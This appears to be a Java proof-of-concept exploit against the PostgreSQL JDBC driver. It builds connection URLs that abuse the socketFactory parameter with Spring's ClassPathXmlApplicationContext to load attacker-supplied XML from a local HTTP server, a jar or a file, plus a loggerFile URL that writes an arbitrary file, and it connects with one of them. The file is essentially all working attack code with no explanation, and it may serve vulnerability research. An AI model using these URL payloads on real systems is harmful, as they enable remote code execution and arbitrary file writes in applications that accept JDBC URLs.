package com.test;

import org.postgresql.Driver;

import java.sql.SQLException;

public class DirectConnect {
    public static void main(String[] args) throws SQLException {
        Driver driver = new Driver();
        String url = "jdbc:postgresql://127.0.0.1:1111/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:7777/1.xml";
        String url1 = "jdbc:postgresql://127.0.0.1:7777/test/";
        String url2 = "jdbc:postgresql://FileWrite/?loggerLevel=DEBUG&loggerFile=D:/log.txt";
        String url3 = "jdbc:postgresql://127.0.0.1:1111/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=jar:file:///D:/postgre_origin.jar!/1.xml";
        String url4 = "jdbc:postgresql://127.0.0.1:1111/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=file:///D:/1.xml";
        driver.connect(url3, null);
    }
}
